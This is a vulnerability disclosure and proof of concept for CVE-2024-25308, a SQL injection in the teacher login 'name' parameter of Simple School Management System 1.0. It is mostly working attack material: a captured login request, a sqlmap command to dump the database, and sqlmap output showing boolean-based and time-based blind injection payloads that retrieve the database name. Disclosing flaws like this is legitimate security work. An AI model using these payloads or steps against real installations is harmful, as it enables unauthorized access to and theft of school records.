# CVE-2024-25308 - Simple School Managment System - SQL Injection - 6 (Teacher Login)
+ **Exploit Title:** Simple School Managment System - SQL Injection - 6 (Teacher Login)
+ **Date:** 2024-01-02
+ **Exploit Author:** Tuba Kavgacı
+ **Vendor Homepage:** https://code-projects.org/simple-school-management-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/d10e92aa-e37f-46fd-9bf8-45878956d7c0
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** CVE-2024-25308

## Description:
Simple School Managment System 1.0 allows SQL Injection via the 'name' parameter at "http://localhost/School/teacher_login.php". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/School/teacher_login.php"
+ Try logging in by typing random things
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
POST /School/teacher_login.php HTTP/1.1
Host: localhost
Content-Length: 28
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/School/teacher_login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=hidk6npo6f802og8sqcir2veul
Connection: close

name=selam&pass=selam&login=

```

+ Use sqlmap to exploit. In sqlmap, use 'name' parameter to dump the database.
```
sqlmap -r r.txt -p name --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: name=selam' OR NOT 5543=5543-- ooCP&pass=selam&login=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=selam' AND (SELECT 5519 FROM (SELECT(SLEEP(5)))CigC)-- ijan&pass=selam&login=
---
[06:47:34] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[06:47:34] [INFO] fetching current database
[06:47:34] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[06:47:34] [INFO] retrieved: school
current database: 'school'


```
+ current database: `school`

![Ekran görüntüsü 2024-02-01 145416](https://github.com/tubakvgc/CVEs/assets/74067343/78b5990d-0f0a-4f0e-9d1b-ddadfd318674)


